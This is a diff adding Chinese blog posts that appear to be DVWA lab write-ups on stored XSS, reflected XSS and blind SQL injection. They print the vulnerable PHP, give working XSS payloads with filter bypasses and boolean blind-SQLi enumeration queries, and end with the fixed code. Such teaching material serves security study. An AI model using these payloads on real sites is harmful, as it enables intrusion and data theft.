@@ -61,6 +61,543 @@
 
     
     
+    <article id="post-XSS_S" class="article article-type-post" itemscope
+  itemprop="blogPost" data-scroll-reveal>
+
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2020/01/09/XSS_S/"
+    >XSS_S</a
+  >
+</h2>
+  
+
+    </header>
+    
+
+    
+    <div class="article-meta">
+      <a href="/2020/01/09/XSS_S/" class="article-date">
+  <time datetime="2020-01-09T06:14:53.288Z" itemprop="datePublished">2020-01-09</time>
+</a>
+      
+    </div>
+    
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+      <h1 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h1><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p>服务器端核心代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">if( isset( $_POST[ &#39;btnSign&#39; ] ) ) &#123; </span><br><span class="line">    &#x2F;&#x2F; Get input </span><br><span class="line">    $message &#x3D; trim( $_POST[ &#39;mtxMessage&#39; ] ); </span><br><span class="line">    $name    &#x3D; trim( $_POST[ &#39;txtName&#39; ] ); </span><br><span class="line">    &#x2F;&#x2F; Sanitize message input </span><br><span class="line">    $message &#x3D; stripslashes( $message ); </span><br><span class="line">    $message &#x3D; mysql_real_escape_string( $message ); </span><br><span class="line">    &#x2F;&#x2F; Sanitize name input </span><br><span class="line">    $name &#x3D; mysql_real_escape_string( $name ); </span><br><span class="line">    &#x2F;&#x2F; Update database </span><br><span class="line">    $query  &#x3D; &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;; </span><br><span class="line">    $result &#x3D; mysql_query( $query ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;&#x2F;pre&gt;&#39; ); </span><br><span class="line">    &#x2F;&#x2F;mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>相关函数介绍</p>
+<p>trim(string,charlist)</p>
+<p>函数移除字符串两侧的空白字符或其他预定义字符，预定义字符包括、\t、\n、\x0B、\r以及空格，可选参数charlist支持添加额外需要删除的字符。</p>
+<p>mysql_real_escape_string(string,connection)</p>
+<p>函数会对字符串中的特殊符号（\x00，\n，\r，\，‘，“，\x1a）进行转义。</p>
+<p>stripslashes(string)</p>
+<p>函数删除字符串中的反斜杠。</p>
+<p>可以看到，对输入并没有做XSS方面的过滤与检查，且存储在数据库中，因此这里存在明显的存储型XSS漏洞。</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>message一栏输入<script>alert(/xss/)</script>，成功弹框，如下图所示：</p>
+<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/XSS_S/37.PNG" alt=""></p>
+<p>name一栏前端有字数限制，抓包改为<script>alert(/name/)</script>，成功弹框，如下图所示：</p>
+<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/XSS_S/38.PNG" alt=""></p>
+<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>服务器端核心代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">if( isset( $_POST[ &#39;btnSign&#39; ] ) ) &#123; </span><br><span class="line">    &#x2F;&#x2F; Get input </span><br><span class="line">    $message &#x3D; trim( $_POST[ &#39;mtxMessage&#39; ] ); </span><br><span class="line">    $name    &#x3D; trim( $_POST[ &#39;txtName&#39; ] ); </span><br><span class="line">    &#x2F;&#x2F; Sanitize message input </span><br><span class="line">    $message &#x3D; strip_tags( addslashes( $message ) ); </span><br><span class="line">    $message &#x3D; mysql_real_escape_string( $message ); </span><br><span class="line">    $message &#x3D; htmlspecialchars( $message ); </span><br><span class="line">    &#x2F;&#x2F; Sanitize name input </span><br><span class="line">    $name &#x3D; str_replace( &#39;&lt;script&gt;&#39;, &#39;&#39;, $name ); </span><br><span class="line">    $name &#x3D; mysql_real_escape_string( $name ); </span><br><span class="line">    &#x2F;&#x2F; Update database </span><br><span class="line">    $query  &#x3D; &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;; </span><br><span class="line">    $result &#x3D; mysql_query( $query ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;&#x2F;pre&gt;&#39; ); </span><br><span class="line">    &#x2F;&#x2F;mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>相关函数说明</p>
+<p>strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签，但允许使用<b>标签。</p>
+<p>addslashes() 函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。</p>
+<p>可以看到，由于对message参数使用了htmlspecialchars函数进行编码，因此无法再通过message参数注入XSS代码，但是对于name参数，只是简单过滤了<script>字符串，仍然存在存储型的XSS。</p>
+<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>1.双写绕过</p>
+<p>抓包改name参数为<sc<script>ript>alert(/xss/)</script>，如下图所示:</p>
+<p><img src="Ehttps://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/XSS_S/39.PNG" alt=""></p>
+<p>成功弹窗，如下图所示：</p>
+<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/XSS_S/40.PNG" alt=""></p>
+<p>2.大小写混淆绕过</p>
+<p>抓包改name参数为<Script>alert(/xss/)</script>，如下图所示:</p>
+<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/XSS_S/41.PNG" alt=""></p>
+<p>成功弹窗，如下图所示：</p>
+<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/XSS_S/42.PNG" alt=""></p>
+<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>服务器端核心代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">if( isset( $_POST[ &#39;btnSign&#39; ] ) ) &#123; </span><br><span class="line">    &#x2F;&#x2F; Get input </span><br><span class="line">    $message &#x3D; trim( $_POST[ &#39;mtxMessage&#39; ] ); </span><br><span class="line">    $name    &#x3D; trim( $_POST[ &#39;txtName&#39; ] ); </span><br><span class="line">    &#x2F;&#x2F; Sanitize message input </span><br><span class="line">    $message &#x3D; strip_tags( addslashes( $message ) ); </span><br><span class="line">    $message &#x3D; mysql_real_escape_string( $message ); </span><br><span class="line">    $message &#x3D; htmlspecialchars( $message ); </span><br><span class="line">    &#x2F;&#x2F; Sanitize name input </span><br><span class="line">    $name &#x3D; preg_replace( &#39;&#x2F;&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t&#x2F;i&#39;, &#39;&#39;, $name ); </span><br><span class="line">    $name &#x3D; mysql_real_escape_string( $name ); </span><br><span class="line">    &#x2F;&#x2F; Update database </span><br><span class="line">    $query  &#x3D; &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;; </span><br><span class="line">    $result &#x3D; mysql_query( $query ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;&#x2F;pre&gt;&#39; ); </span><br><span class="line">    &#x2F;&#x2F;mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，这里使用正则表达式过滤了<script>标签，但是却忽略了img、iframe等其它危险的标签，因此name参数依旧存在存储型XSS。</p>
+<p>抓包改name参数为<img src=1 onerror=alert(1)>，如下图所示：</p>
+<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/XSS_S/43.PNG" alt=""></p>
+<p>成功弹窗，如下图所示：</p>
+<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/XSS_S/44.PNG" alt=""></p>
+<h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><p>服务器端核心代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">if( isset( $_POST[ &#39;btnSign&#39; ] ) ) &#123; </span><br><span class="line">    &#x2F;&#x2F; Check Anti-CSRF token </span><br><span class="line">    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); </span><br><span class="line">    &#x2F;&#x2F; Get input </span><br><span class="line">    $message &#x3D; trim( $_POST[ &#39;mtxMessage&#39; ] ); </span><br><span class="line">    $name    &#x3D; trim( $_POST[ &#39;txtName&#39; ] ); </span><br><span class="line">    &#x2F;&#x2F; Sanitize message input </span><br><span class="line">    $message &#x3D; stripslashes( $message ); </span><br><span class="line">    $message &#x3D; mysql_real_escape_string( $message ); </span><br><span class="line">    $message &#x3D; htmlspecialchars( $message ); </span><br><span class="line">    &#x2F;&#x2F; Sanitize name input </span><br><span class="line">    $name &#x3D; stripslashes( $name ); </span><br><span class="line">    $name &#x3D; mysql_real_escape_string( $name ); </span><br><span class="line">    $name &#x3D; htmlspecialchars( $name ); </span><br><span class="line">    &#x2F;&#x2F; Update database </span><br><span class="line">    $data &#x3D; $db-&gt;prepare( &#39;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&#39; ); </span><br><span class="line">    $data-&gt;bindParam( &#39;:message&#39;, $message, PDO::PARAM_STR ); </span><br><span class="line">    $data-&gt;bindParam( &#39;:name&#39;, $name, PDO::PARAM_STR ); </span><br><span class="line">    $data-&gt;execute(); </span><br><span class="line">&#125; </span><br><span class="line">&#x2F;&#x2F; Generate Anti-CSRF token </span><br><span class="line">generateSessionToken(); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，通过使用htmlspecialchars函数，解决了XSS，但是要注意的是，如果htmlspecialchars函数使用不当，攻击者就可以通过编码的方式绕过函数进行XSS注入，尤其是DOM型的XSS。</p>
+
+      
+      <!-- 打赏 -->
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/01/09/XSS_S/" data-id="ck56chf9h0003fcvo3qzn0dpo"
+        class="article-share-link">分享</a>
+      
+    </footer>
+
+  </div>
+
+  
+
+  
+  
+  
+
+  
+
+</article>
+    
+    <article id="post-XSS_R" class="article article-type-post" itemscope
+  itemprop="blogPost" data-scroll-reveal>
+
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2020/01/09/XSS_R/"
+    >XSS_R</a
+  >
+</h2>
+  
+
+    </header>
+    
+
+    
+    <div class="article-meta">
+      <a href="/2020/01/09/XSS_R/" class="article-date">
+  <time datetime="2020-01-09T06:14:53.284Z" itemprop="datePublished">2020-01-09</time>
+</a>
+      
+    </div>
+    
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+      <h1 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h1><p>下面对四种级别的代码进行分析。</p>
+<h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p>服务器端核心代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">&#x2F;&#x2F; Is there any input? </span><br><span class="line">if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] !&#x3D; NULL ) &#123; </span><br><span class="line">    &#x2F;&#x2F; Feedback for end user </span><br><span class="line">    echo &#39;&lt;pre&gt;Hello &#39; . $_GET[ &#39;name&#39; ] . &#39;&lt;&#x2F;pre&gt;&#39;; </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，代码直接引用了name参数，并没有任何的过滤与检查，存在明显的XSS漏洞。</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>输入<script>alert(/xss/)</script>，成功弹框，如下图所示：</p>
+<p><img src="E:%5C%E8%AF%BE%E8%AE%BE%E6%88%AA%E5%9B%BE%5C33.PNG" alt=""></p>
+<h3 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h3><p>服务器端核心代码</p>
+<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/XSS_R/33.PNG" alt="">!</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">&#x2F;&#x2F; Is there any input? </span><br><span class="line">if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] !&#x3D; NULL ) &#123; </span><br><span class="line">    &#x2F;&#x2F; Get input </span><br><span class="line">    $name &#x3D; str_replace( &#39;&lt;script&gt;&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] ); </span><br><span class="line">    &#x2F;&#x2F; Feedback for end user </span><br><span class="line">    echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;&#x2F;pre&gt;&quot;; </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，这里对输入进行了过滤，基于黑名单的思想，使用str_replace函数将输入中的<script>删除，这种防护机制是可以被轻松绕过的。</p>
+<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>1.双写绕过</p>
+<p>输入<sc<script>ript>alert(/xss/)</script>，成功弹框，如下图所示：</p>
+<p><img src="Ehttps://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/XSS_R/34.PNG" alt=""></p>
+<p>2.大小写混淆绕过</p>
+<p>输入<ScRipt>alert(/xss/)</script>，成功弹框，如下图所示：</p>
+<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/XSS_R/35.PNG" alt=""></p>
+<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>服务器端核心代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">&#x2F;&#x2F; Is there any input? </span><br><span class="line">if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] !&#x3D; NULL ) &#123; </span><br><span class="line">    &#x2F;&#x2F; Get input </span><br><span class="line">    $name &#x3D; preg_replace( &#39;&#x2F;&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t&#x2F;i&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] ); </span><br><span class="line">    &#x2F;&#x2F; Feedback for end user </span><br><span class="line">    echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;&#x2F;pre&gt;&quot;; </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，High级别的代码同样使用黑名单过滤输入，preg_replace() 函数用于正则表达式的搜索和替换，这使得双写绕过、大小写混淆绕过（正则表达式中i表示不区分大小写）不再有效。</p>
+<h3 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>虽然无法使用<script>标签注入XSS代码，但是可以通过img、body等标签的事件或者iframe等标签的src注入恶意的js代码。</p>
+<p>输入<img src=1 onerror=alert(/xss/)>，成功弹框，如下图所示：</p>
+<p><img src="Ehttps://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/XSS_R/36.PNG" alt=""></p>
+<h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><p>服务器端核心代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">&#x2F;&#x2F; Is there any input? </span><br><span class="line">if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] !&#x3D; NULL ) &#123; </span><br><span class="line">    &#x2F;&#x2F; Check Anti-CSRF token </span><br><span class="line">    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); </span><br><span class="line">    &#x2F;&#x2F; Get input </span><br><span class="line">    $name &#x3D; htmlspecialchars( $_GET[ &#39;name&#39; ] ); </span><br><span class="line">    &#x2F;&#x2F; Feedback for end user </span><br><span class="line">    echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;&#x2F;pre&gt;&quot;; </span><br><span class="line">&#125; </span><br><span class="line">&#x2F;&#x2F; Generate Anti-CSRF token </span><br><span class="line">generateSessionToken(); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，Impossible级别的代码使用htmlspecialchars函数把预定义的字符&、”、 ’、<、>转换为 HTML 实体，防止浏览器将其作为HTML元素。</p>
+
+      
+      <!-- 打赏 -->
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/01/09/XSS_R/" data-id="ck56chf990002fcvof8kh5lrj"
+        class="article-share-link">分享</a>
+      
+    </footer>
+
+  </div>
+
+  
+
+  
+  
+  
+
+  
+
+</article>
+    
+    <article id="post-SQL Injection(Blind)" class="article article-type-post" itemscope
+  itemprop="blogPost" data-scroll-reveal>
+
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2020/01/09/SQL%20Injection(Blind)/"
+    >SQL Injection(Blind)</a
+  >
+</h2>
+  
+
+    </header>
+    
+
+    
+    <div class="article-meta">
+      <a href="/2020/01/09/SQL%20Injection(Blind)/" class="article-date">
+  <time datetime="2020-01-09T06:14:53.276Z" itemprop="datePublished">2020-01-09</time>
+</a>
+      
+    </div>
+    
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+      <h1 id="SQL-Injection-Blind"><a href="#SQL-Injection-Blind" class="headerlink" title="SQL Injection(Blind)"></a>SQL Injection(Blind)</h1><p>SQL Injection（Blind），即SQL盲注，与一般注入的区别在于，一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。目前网络上现存的SQL注入漏洞大多是SQL盲注。</p>
+<h2 id="手工盲注思路"><a href="#手工盲注思路" class="headerlink" title="手工盲注思路"></a>手工盲注思路</h2><p>手工盲注的过程，就像你与一个机器人聊天，这个机器人知道的很多，但只会回答“是”或者“不是”，因此你需要询问它这样的问题，例如“数据库名字的第一个字母是不是a啊？”，通过这种机械的询问，最终获得你想要的数据。</p>
+<p>盲注分为基于布尔的盲注、基于时间的盲注以及基于报错的盲注，这里由于实验环境的限制，只演示基于布尔的盲注与基于时间的盲注。</p>
+<p>下面简要介绍手工盲注的步骤（可与之前的<a href="http://www.freebuf.com/articles/web/120747.html" target="_blank" rel="noopener">手工注入</a>作比较）：</p>
+<p>1.判断是否存在注入，注入是字符型还是数字型</p>
+<p>2.猜解当前数据库名</p>
+<p>3.猜解数据库中的表名</p>
+<p>4.猜解表中的字段名</p>
+<p>5.猜解数据</p>
+<p>下面对四种级别的代码进行分析。</p>
+<h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p>服务器端核心代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &#39;Submit&#39; ] ) ) &#123; </span><br><span class="line">    &#x2F;&#x2F; Get input </span><br><span class="line">    $id &#x3D; $_GET[ &#39;id&#39; ]; </span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Check database </span><br><span class="line">    $getid  &#x3D; &quot;SELECT first_name, last_name FROM users WHERE user_id &#x3D; &#39;$id&#39;;&quot;; </span><br><span class="line">    $result &#x3D; mysql_query( $getid ); &#x2F;&#x2F; Removed &#39;or die&#39; to suppress mysql errors </span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Get results </span><br><span class="line">    $num &#x3D; @mysql_numrows( $result ); &#x2F;&#x2F; The &#39;@&#39; character suppresses errors </span><br><span class="line">    if( $num &gt; 0 ) &#123; </span><br><span class="line">        &#x2F;&#x2F; Feedback for end user </span><br><span class="line">        echo &#39;&lt;pre&gt;User ID exists in the database.&lt;&#x2F;pre&gt;&#39;; </span><br><span class="line">    &#125; </span><br><span class="line">    else &#123; </span><br><span class="line">        &#x2F;&#x2F; User wasn&#39;t found, so the page wasn&#39;t! </span><br><span class="line">        header( $_SERVER[ &#39;SERVER_PROTOCOL&#39; ] . &#39; 404 Not Found&#39; ); </span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Feedback for end user </span><br><span class="line">        echo &#39;&lt;pre&gt;User ID is MISSING from the database.&lt;&#x2F;pre&gt;&#39;; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，Low级别的代码对参数id没有做任何检查、过滤，存在明显的SQL注入漏洞，同时SQL语句查询返回的结果只有两种，‘</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User ID exists in the database.</span><br></pre></td></tr></table></figure>
+
+<p>‘与‘</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#96;User ID is MISSING from the database.&#96;</span><br></pre></td></tr></table></figure>
+
+<p>‘，因此这里是SQL盲注漏洞。</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>首先演示<strong>基于布尔的盲注</strong>：</p>
+<h3 id="1-判断是否存在注入，注入是字符型还是数字型"><a href="#1-判断是否存在注入，注入是字符型还是数字型" class="headerlink" title="1.判断是否存在注入，注入是字符型还是数字型"></a>1.判断是否存在注入，注入是字符型还是数字型</h3><p>输入1，显示相应用户存在如下图所示：</p>
+<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL_Blind/23.PNG" alt=""></p>
+<p>输入1’ and 1=1 #，显示存在，如下图所示：</p>
+<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL_Blind/24.PNG" alt=""></p>
+<p>输入1’ and 1=2 #，显示不存在，如下图所示：</p>
+<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL_Blind/25.PNG" alt=""></p>
+<p>说明存在字符型的SQL盲注。</p>
+<h3 id="2-猜解当前数据库名"><a href="#2-猜解当前数据库名" class="headerlink" title="2.猜解当前数据库名"></a>2.猜解当前数据库名</h3><p>想要猜解数据库名，首先要猜解数据库名的长度，然后挨个猜解字符。</p>
+<p>输入1’ and length(database())=1 #，显示不存在；</p>
+<p>输入1’ and length(database())=2 #，显示不存在；</p>
+<p>输入1’ and length(database())=3 #，显示不存在；</p>
+<p>输入1’ and length(database())=4 #，显示存在，如下图所示：</p>
+<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL_Blind/26.PNG" alt=""></p>
+<p>说明数据库名长度为4。</p>
+<p>下面采用二分法猜解数据库名。</p>
+<p>输入1’ and ascii(substr(database(),1,1))&gt;97 #，显示存在，说明数据库名的第一个字符的ascii值大于97（小写字母a的ascii值）；</p>
+<p>输入1’ and ascii(substr(database(),1,1))&lt;122 #，显示存在，说明数据库名的第一个字符的ascii值小于122（小写字母z的ascii值）；</p>
+<p>输入1’ and ascii(substr(database(),1,1))&lt;109 #，显示存在，说明数据库名的第一个字符的ascii值小于109（小写字母m的ascii值）；</p>
+<p>输入1’ and ascii(substr(database(),1,1))&lt;103 #，显示存在，说明数据库名的第一个字符的ascii值小于103（小写字母g的ascii值）；</p>
+<p>输入1’ and ascii(substr(database(),1,1))=100 #，显示存在，说明数据库名的第一个字符的ascii值等于100（小写字母d的ascii值），即小写字母d，如下图所示：</p>
+<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL_Blind/27.PNG" alt=""></p>
+<p>重复上述步骤，就可以猜解出完整的数据库名（dvwa）了。</p>
+<h3 id="3-猜解数据库中的表名"><a href="#3-猜解数据库中的表名" class="headerlink" title="3.猜解数据库中的表名"></a>3.猜解数据库中的表名</h3><p>首先猜解数据库中表的数量：</p>
+<p>1’ and (select count(table_name) from information_schema.tables where table_schema=’dvwa’)=1 # 显示不存在</p>
+<p>1’ and (select count(table_name) from information_schema.tables where table_schema=’dvwa’)=2 # 显示存在,如下图所示：</p>
+<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL_Blind/28.PNG" alt=""></p>
+<p>说明数据库中共有两个表。</p>
+<p>接着挨个猜解表名：</p>
+<p>1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1 # 显示不存在</p>
+<p>1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=2 # 显示不存在</p>
+<p>…</p>
+<p>1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 # 显示存在,如下图所示：</p>
+<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL_Blind/29.PNG" alt=""></p>
+<p>说明第一个表名长度为9。</p>
+<p>1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;97 # 显示存在</p>
+<p>1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;122 # 显示存在</p>
+<p>1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;109 # 显示存在</p>
+<p>1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=103 # 显示存在，如下图所示:</p>
+<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL_Blind/30.PNG" alt=""></p>
+<p>说明第一个表的名字的第一个字符为小写字母g。</p>
+<p>…</p>
+<p>重复上述步骤，即可猜解出两个表名（guestbook、users）。</p>
